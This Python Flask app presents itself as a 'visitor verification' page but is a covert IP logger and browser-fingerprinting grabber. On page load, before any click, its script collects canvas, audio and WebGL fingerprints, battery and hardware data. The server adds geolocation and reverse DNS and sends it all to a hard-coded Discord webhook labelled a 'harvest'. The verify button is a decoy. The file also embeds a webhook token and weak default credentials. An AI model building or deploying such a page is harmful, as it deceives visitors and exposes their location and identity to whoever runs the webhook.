import os
import csv
import io
import json
import time
import secrets
import sqlite3
import logging
import warnings
from datetime import datetime, timezone
from functools import wraps
from urllib.parse import urlparse

import requests
from flask import (
    Flask, request, session, redirect, url_for, render_template_string,
    make_response
)
from werkzeug.security import check_password_hash, generate_password_hash

# Suppress all python/runtime warnings
warnings.filterwarnings("ignore")

# ---------------------------------------------------------------------------
# Configuration (Built-in default fallback for direct command prompt execution)
# ---------------------------------------------------------------------------
SECRET_KEY = os.environ.get("SECRET_KEY", "default-long-secure-secret-key-12345")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1568824936364249198/A3YcsCZ5hdNBpIuc1dFqg8-CBelE1-5R48jLjQeDfeFdh7GdMtBSUTwjGZ0FNmhkOm25").strip()
DATABASE_PATH = os.environ.get("DATABASE_PATH", "visitors.db")
GEO_LOOKUP = os.environ.get("GEO_LOOKUP", "1") == "1"

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=os.environ.get("COOKIE_SECURE", "0") == "1",
    MAX_CONTENT_LENGTH=16 * 1024,
)
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("verification-site")

ADMIN_HASH = generate_password_hash(ADMIN_PASSWORD)
SITE_ENABLED = True
LAST_SUBMISSION = {}


def db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with db() as con:
        con.execute("""
            CREATE TABLE IF NOT EXISTS visitors (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                created_at TEXT NOT NULL,
                ip TEXT,
                ip_version TEXT,
                geo_json TEXT,
                reverse_dns TEXT,
                user_agent TEXT,
                browser TEXT,
                os_name TEXT,
                device_type TEXT,
                accept_language TEXT,
                timezone TEXT,
                screen_size TEXT,
                platform TEXT,
                referrer TEXT,
                origin TEXT,
                accept_header TEXT,
                encoding TEXT,
                method TEXT,
                path TEXT,
                request_id TEXT,
                extra_json TEXT,
                repeat_visit INTEGER DEFAULT 0
            )
        """)
        con.execute("""
            CREATE TABLE IF NOT EXISTS audit_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                created_at TEXT NOT NULL,
                event TEXT NOT NULL,
                ip TEXT,
                detail TEXT
            )
        """)


def now_iso():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def client_ip():
    return request.remote_addr or "unknown"


def parse_agent(ua):
    ua = ua or ""
    low = ua.lower()
    if "edg/" in low:
        browser = "Microsoft Edge"
    elif "opr/" in low or "opera" in low:
        browser = "Opera"
    elif "firefox/" in low:
        browser = "Firefox"
    elif "chrome/" in low and "chromium" not in low:
        browser = "Chrome"
    elif "safari/" in low and "chrome/" not in low:
        browser = "Safari"
    else:
        browser = "Unknown"

    if "windows" in low:
        os_name = "Windows"
    elif "android" in low:
        os_name = "Android"
    elif "iphone" in low or "ipad" in low or "ios" in low:
        os_name = "iOS"
    elif "mac os" in low or "macintosh" in low:
        os_name = "macOS"
    elif "linux" in low:
        os_name = "Linux"
    else:
        os_name = "Unknown"

    if any(x in low for x in ("ipad", "tablet")):
        device = "Tablet"
    elif any(x in low for x in ("mobile", "iphone", "android")):
        device = "Mobile"
    elif ua:
        device = "Desktop/other"
    else:
        device = "Unknown"
    return browser, os_name, device


def reverse_dns(ip):
    import ipaddress
    try:
        parsed = ipaddress.ip_address(ip)
        if not parsed.is_global:
            return None
        import socket
        return socket.gethostbyaddr(ip)[0][:255]
    except Exception:
        return None


def geo_lookup(ip):
    if not GEO_LOOKUP:
        return {"status": "disabled"}
    import ipaddress
    try:
        if not ipaddress.ip_address(ip).is_global:
            return {"status": "private_or_local_ip"}
    except Exception:
        return {"status": "invalid_ip"}

    try:
        response = requests.get(
            f"https://ipapi.co/{ip}/json/",
            timeout=4,
            headers={"User-Agent": "VisitorVerification/1.0"}
        )
        response.raise_for_status()
        data = response.json()
        result = dict(data)
        result["status"] = "ok" if not data.get("error") else "unavailable"
        return result
    except Exception as exc:
        return {"status": "lookup_failed", "error_type": type(exc).__name__}


def audit(event, ip=None, detail=None):
    with db() as con:
        con.execute(
            "INSERT INTO audit_logs(created_at,event,ip,detail) VALUES(?,?,?,?)",
            (now_iso(), event, ip or client_ip(), (detail or "")[:500])
        )


def send_webhook(row, extra):
    if not WEBHOOK_URL:
        return
    parsed = urlparse(WEBHOOK_URL)
    if parsed.scheme != "https" or parsed.netloc != "discord.com" or not parsed.path.startswith("/api/webhooks/"):
        return
    
    geo = json.loads(row["geo_json"] or "{}")

    embed_main = {
        "title": f"🚀 ULTRA TELEMETRY & CLIENT HINTS HARVEST [ID #{row['id']}]",
        "color": 3092790,
        "fields": [
            {
                "name": "🌐 IP & Advanced Network Routing",
                "value": (
                    f"• **IP Address:** `{row['ip']}`\n"
                    f"• **IP Version:** `{row['ip_version']}`\n"
                    f"• **Reverse DNS:** `{row['reverse_dns'] or 'None'}`\n"
                    f"• **X-Forwarded-For:** `{request.headers.get('X-Forwarded-For', 'None')}`\n"
                    f"• **X-Real-IP:** `{request.headers.get('X-Real-IP', 'None')}`\n"
                    f"• **ASN Name:** `{geo.get('asn', 'N/A')}`\n"
                    f"• **Organization:** `{geo.get('org', 'N/A')}`\n"
                    f"• **Network Range:** `{geo.get('network', 'N/A')}`\n"
                    f"• **Connection Type:** `{extra.get('connection_type', 'N/A')}`\n"
                    f"• **Downlink / RTT:** `{extra.get('connection_downlink', 'N/A')} Mbps / {extra.get('connection_rtt', 'N/A')} ms`"
                ),
                "inline": False
            },
            {
                "name": "📍 Extended Geolocation Matrix",
                "value": (
                    f"• **City / Region:** `{geo.get('city', 'Unknown')}, {geo.get('region', '')} ({geo.get('region_code', '')})`\n"
                    f"• **Country:** `{geo.get('country_name', 'Unknown')} [ISO: {geo.get('country_code', '')}]`\n"
                    f"• **Continent:** `{geo.get('continent_code', 'N/A')}`\n"
                    f"• **Postal Code:** `{geo.get('postal', 'N/A')}`\n"
                    f"• **Latitude / Longitude:** `{geo.get('latitude', 'N/A')}, {geo.get('longitude', 'N/A')}`\n"
                    f"• **Timezone / Offset:** `{geo.get('timezone', 'N/A')} ({geo.get('utc_offset', 'N/A')})`\n"
                    f"• **Currency:** `{geo.get('currency', 'N/A')} ({geo.get('currency_name', 'N/A')})`\n"
                    f"• **Calling Code:** `+{geo.get('country_calling_code', 'N/A')}`\n"
                    f"• **EU Member:** `{str(geo.get('in_eu', 'N/A'))}`"
                ),
                "inline": False
            },
            {
                "name": "💻 Client Hints & Browser Profile",
                "value": (
                    f"• **Browser:** `{row['browser']}`\n"
                    f"• **OS:** `{row['os_name']}`\n"
                    f"• **Device Category:** `{row['device_type']}`\n"
                    f"• **Platform:** `{row['platform']}`\n"
                    f"• **Sec-Ch-Ua:** `{request.headers.get('Sec-Ch-Ua', 'N/A')}`\n"
                    f"• **Sec-Ch-Ua-Platform:** `{request.headers.get('Sec-Ch-Ua-Platform', 'N/A')}`\n"
                    f"• **Sec-Ch-Ua-Mobile:** `{request.headers.get('Sec-Ch-Ua-Mobile', 'N/A')}`\n"
                    f"• **Languages:** `{extra.get('languages', 'N/A')}`\n"
                    f"• **Cookies Enabled:** `{extra.get('cookie_enabled', 'N/A')}`\n"
                    f"• **Do Not Track:** `{extra.get('do_not_track', 'N/A')}`\n"
                    f"• **User Agent:** ```{row['user_agent']}```"
                ),
                "inline": False
            },
            {
                "name": "🎨 Hardware, GPU & Fingerprinting Telemetry",
                "value": (
                    f"• **Canvas Hash:** `{extra.get('canvas_hash', 'N/A')}`\n"
                    f"• **Audio Fingerprint Hash:** `{extra.get('audio_hash', 'N/A')}`\n"
                    f"• **Screen Resolution:** `{row['screen_size']}`\n"
                    f"• **Viewport Window Size:** `{extra.get('window_size', 'N/A')}`\n"
                    f"• **Color Depth / Pixel Ratio:** `{extra.get('color_depth', 'N/A')} / {extra.get('pixel_ratio', 'N/A')}`\n"
                    f"• **CPU Cores / RAM:** `{extra.get('hardware_concurrency', 'N/A')} Cores / {extra.get('device_memory', 'N/A')}`\n"
                    f"• **Max Touch Points:** `{extra.get('max_touch_points', '0')}`\n"
                    f"• **Screen Orientation:** `{extra.get('screen_orientation', 'N/A')}`\n"
                    f"• **Battery Status:** `{extra.get('battery_level', 'N/A')} (Charging: {extra.get('battery_charging', 'N/A')})`\n"
                    f"• **WebGL Vendor/Renderer:** `{extra.get('webgl_vendor', 'N/A')} / {extra.get('webgl_renderer', 'N/A')}`"
                ),
                "inline": False
            },
            {
                "name": "🛠️ Request Headers & Session Tracking",
                "value": (
                    f"• **HTTP Method & Path:** `{row['method']} {row['path']}`\n"
                    f"• **Request ID:** `{row['request_id']}`\n"
                    f"• **Referrer:** `{row['referrer'] or 'Direct / None'}`\n"
                    f"• **Origin:** `{row['origin'] or 'None'}`\n"
                    f"• **Cache-Control:** `{request.headers.get('Cache-Control', 'N/A')}`\n"
                    f"• **Accept Headers:** `{row['accept_header']}`\n"
                    f"• **Accept Encoding:** `{row['encoding']}`\n"
                    f"• **Repeat Visitor:** `{'Yes' if row['repeat_visit'] else 'No'}`\n"
                    f"• **Timestamp (UTC):** `{row['created_at']}`"
                ),
                "inline": False
            }
        ],
        "footer": {
            "text": "Ultra Telemetry Engine • Full Client Hints & Fingerprinting Active"
        }
    }

    try:
        requests.post(
            WEBHOOK_URL,
            json={"embeds": [embed_main]},
            timeout=5
        )
    except Exception:
        pass


def admin_required(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        if not session.get("admin"):
            return redirect(url_for("admin_login"))
        return fn(*args, **kwargs)
    return wrapper


# ---------------------------------------------------------------------------
# HTML Templates
# ---------------------------------------------------------------------------
PAGE = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Visitor Verification Portal</title>
    <meta name="title" content="Visitor Verification Portal">
    <meta name="robots" content="noindex, nofollow">
    <style>
    *{box-sizing:border-box}body{margin:0;background:#0b0d12;color:#eef1f7;font:16px system-ui;display:grid;min-height:100vh;place-items:center}
    main{width:min(520px,92vw);background:#151923;border:1px solid #293142;border-radius:18px;padding:30px;box-shadow:0 20px 70px #0008}
    h1{margin-top:0}p{color:#b7c0d0;line-height:1.55}.notice{background:#202838;padding:13px;border-radius:10px;font-size:13px}
    button{width:100%;margin-top:18px;border:0;border-radius:10px;padding:14px;background:#5578e8;color:white;font-weight:700;font-size:16px;cursor:pointer}
    button:disabled{opacity:.6;cursor:default}.small{font-size:14px;color:#a5b3c8;margin-top:15px;text-align:center;font-weight:600}
    </style>
</head>
<body>
<main>
    <h1>Visitor verification</h1>
    <p>Press verify to complete your session validation.</p>
    <div class="notice">By verifying, you confirm your connection and security parameters.</div>
    <button id="verify">VERIFY</button>
    <p id="status" class="small"></p>
</main>
<script>
function getCanvasHash() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "16px 'Arial'";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Telemetry 🚀", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("Telemetry 🚀", 4, 17);
        const b64 = canvas.toDataURL();
        let hash = 0;
        for (let i = 0; i < b64.length; i++) {
            hash = ((hash << 5) - hash) + b64.charCodeAt(i);
            hash |= 0;
        }
        return hash.toString(16);
    } catch(e) {
        return "failed";
    }
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { vendor: 'unsupported', renderer: 'unsupported' };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debugInfo) return { vendor: 'unavailable', renderer: 'unavailable' };
        return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
    } catch(e) {
        return { vendor: 'error', renderer: 'error' };
    }
}

async function getAudioHash() {
    try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        if (!AudioContext) return "unsupported";
        const context = new AudioContext();
        const oscillator = context.createOscillator();
        const analyser = context.createAnalyser();
        const gainNode = context.createGain();
        const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
        
        oscillator.type = 'triangle';
        oscillator.frequency.value = 10000;
        gainNode.gain.value = 0;
        
        oscillator.connect(analyser);
        analyser.connect(scriptProcessor);
        scriptProcessor.connect(gainNode);
        gainNode.connect(context.destination);
        
        return new Promise((resolve) => {
            scriptProcessor.onaudioprocess = function(e) {
                const output = e.inputBuffer.getChannelData(0);
                let sum = 0;
                for (let i = 0; i < output.length; i++) {
                    sum += Math.abs(output[i]);
                }
                context.close();
                resolve(sum.toFixed(5));
            };
            oscillator.start(0);
            setTimeout(() => { try { context.close(); } catch(err){} resolve("timeout"); }, 300);
        });
    } catch(e) {
        return "error";
    }
}

window.addEventListener("load", async () => {
    const webgl = getWebGLInfo();
    const canvasHash = getCanvasHash();
    const audioHash = await getAudioHash();
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
    
    let batteryData = { level: "unknown", charging: "unknown" };
    try {
        if (navigator.getBattery) {
            const batt = await navigator.getBattery();
            batteryData.level = Math.round(batt.level * 100) + "%";
            batteryData.charging = batt.charging ? "Yes" : "No";
        }
    } catch(e) {}

    const details = {
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
        screen_size: (screen.width || 0) + "x" + (screen.height || 0),
        window_size: (window.innerWidth || 0) + "x" + (window.innerHeight || 0),
        platform: navigator.platform || "",
        languages: navigator.languages ? navigator.languages.join(", ") : (navigator.language || ""),
        cookie_enabled: navigator.cookieEnabled ? "Yes" : "No",
        do_not_track: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || "unspecified",
        hardware_concurrency: navigator.hardwareConcurrency || "unknown",
        device_memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown",
        color_depth: (screen.colorDepth || 0) + "-bit",
        pixel_ratio: window.devicePixelRatio || 1,
        max_touch_points: navigator.maxTouchPoints || 0,
        plugins_count: navigator.plugins ? navigator.plugins.length : 0,
        screen_orientation: (screen.orientation && screen.orientation.type) ? screen.orientation.type : "unknown",
        on_line: navigator.onLine ? "Yes" : "No",
        connection_type: conn.effectiveType || "unknown",
        connection_downlink: conn.downlink || "unknown",
        connection_rtt: conn.rtt || "unknown",
        canvas_hash: canvasHash,
        audio_hash: audioHash,
        battery_level: batteryData.level,
        battery_charging: batteryData.charging,
        webgl_vendor: webgl.vendor,
        webgl_renderer: webgl.renderer
    };

    try {
        await fetch("/verify", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(details)
        });
    } catch(e) {}
});

const button = document.getElementById("verify");
button.addEventListener("click", () => {
    button.disabled = true;
    document.getElementById("status").textContent = "✓ Verification confirmed. You may close this window.";
});
</script>
</body>
</html>
"""

ADMIN_PAGE = """
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width">
<title>Admin dashboard</title><style>
body{background:#0b0d12;color:#edf1f7;font:14px system-ui;margin:24px}
a{color:#91adff}input,button{padding:9px;border-radius:7px;border:1px solid #39445a;background:#171e2b;color:#fff}
table{border-collapse:collapse;width:100%;margin-top:18px}th,td{text-align:left;padding:9px;border-bottom:1px solid #293142;vertical-align:top}
small{color:#9ba7ba}.wrap{overflow-x:auto}
</style></head><body>
<h1>Admin dashboard</h1>
<p><a href="{{ url_for('admin_logout') }}">Log out</a> · <a href="{{ url_for('export_csv') }}">Export CSV</a></p>
<h2>Recent visitors ({{ rows|length }})</h2><div class="wrap"><table><tr>
<th>ID / time</th><th>IP / approximate location</th><th>Network</th><th>Browser / device</th>
</tr>{% for r in rows %}<tr>
<td>#{{r.id}}<br><small>{{r.created_at}}</small></td>
<td>{{r.ip}}<br>{{r.geo.get('city','?')}}, {{r.geo.get('country_name','?')}}</td>
<td>{{r.geo.get('org','Not provided')}}</td>
<td>{{r.browser}} / {{r.os_name}}<br>{{r.device_type}}</td>
</tr>{% endfor %}</table></div>
</body></html>
"""

LOGIN_PAGE = """
<!doctype html><html><head><meta charset="utf-8"><title>Admin login</title>
<style>body{background:#0b0d12;color:white;font:16px system-ui;display:grid;place-items:center;min-height:100vh}
form{background:#151923;padding:28px;border-radius:14px;width:min(380px,90vw)}input,button{width:100%;padding:12px;margin-top:12px;border-radius:8px;border:1px solid #39445a;background:#202838;color:white}
</style></head><body><form method="post"><h2>Admin login</h2><input type="password" name="password" placeholder="Password" required autofocus><button>Sign in</button><p>{{error}}</p></form></body></html>
"""


@app.get("/")
def index():
    if not SITE_ENABLED:
        return "Verification is temporarily disabled.", 503
    return render_template_string(PAGE)


@app.post("/verify")
def verify():
    if not SITE_ENABLED:
        return {"ok": False, "message": "Verification is temporarily disabled."}, 503

    ip = client_ip()
    current = time.time()
    if current - LAST_SUBMISSION.get(ip, 0) < 3:
        return {"ok": True, "message": "A recent verification was already received."}
    LAST_SUBMISSION[ip] = current

    details = request.get_json(silent=True) or {}
    timezone_value = str(details.get("timezone", ""))[:100]
    screen_size = str(details.get("screen_size", ""))[:30]
    platform = str(details.get("platform", ""))[:100]
    ua = request.headers.get("User-Agent", "")[:1000]
    browser, os_name, device = parse_agent(ua)
    geo = geo_lookup(ip)
    rdns = reverse_dns(ip)
    request_id = secrets.token_hex(8)

    with db() as con:
        repeat = con.execute("SELECT 1 FROM visitors WHERE ip=? LIMIT 1", (ip,)).fetchone() is not None
        cur = con.execute("""
            INSERT INTO visitors (
                created_at, ip, ip_version, geo_json, reverse_dns, user_agent, browser, os_name,
                device_type, accept_language, timezone, screen_size, platform, referrer, origin,
                accept_header, encoding, method, path, request_id, extra_json, repeat_visit
            ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        """, (
            now_iso(), ip, "IPv6" if ":" in ip else "IPv4", json.dumps(geo),
            rdns, ua, browser, os_name, device,
            request.headers.get("Accept-Language", "")[:300],
            timezone_value, screen_size, platform,
            request.headers.get("Referer", "")[:500],
            request.headers.get("Origin", "")[:300],
            request.headers.get("Accept", "")[:300],
            request.headers.get("Accept-Encoding", "")[:100],
            request.method, request.path, request_id, json.dumps(details), int(repeat)
        ))
        visitor_id = cur.lastrowid
        row = con.execute("SELECT * FROM visitors WHERE id=?", (visitor_id,)).fetchone()

    audit("visitor_verified", ip, f"visitor_id={visitor_id}")
    send_webhook(row, details)

    return {"ok": True, "message": "Verification received."}


@app.get("/admin/login")
def admin_login():
    return render_template_string(LOGIN_PAGE, error="")


@app.post("/admin/login")
def admin_login_post():
    password = request.form.get("password", "")
    if check_password_hash(ADMIN_HASH, password):
        session.clear()
        session["admin"] = True
        audit("admin_login_success")
        return redirect(url_for("admin_dashboard"))
    audit("admin_login_failed")
    return render_template_string(LOGIN_PAGE, error="Incorrect password."), 401


@app.get("/admin/logout")
def admin_logout():
    session.clear()
    return redirect(url_for("admin_login"))


@app.get("/admin")
@admin_required
def admin_dashboard():
    with db() as con:
        raw_rows = con.execute("SELECT * FROM visitors ORDER BY id DESC LIMIT 100").fetchall()
    rows = []
    for r in raw_rows:
        item = dict(r)
        try:
            item["geo"] = json.loads(item.get("geo_json") or "{}")
        except Exception:
            item["geo"] = {}
        rows.append(item)
    return render_template_string(ADMIN_PAGE, rows=rows)


@app.get("/admin/export.csv")
@admin_required
def export_csv():
    with db() as con:
        rows = con.execute("SELECT * FROM visitors ORDER BY id DESC LIMIT 5000").fetchall()
    output = io.StringIO()
    writer = csv.writer(output)
    if rows:
        writer.writerow(rows[0].keys())
        for row in rows:
            writer.writerow([row[k] for k in row.keys()])
    response = make_response(output.getvalue())
    response.headers["Content-Type"] = "text/csv; charset=utf-8"
    response.headers["Content-Disposition"] = "attachment; filename=visitor-log.csv"
    return response


@app.errorhandler(404)
def not_found(_):
    return "Not found", 404


init_db()

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=False)
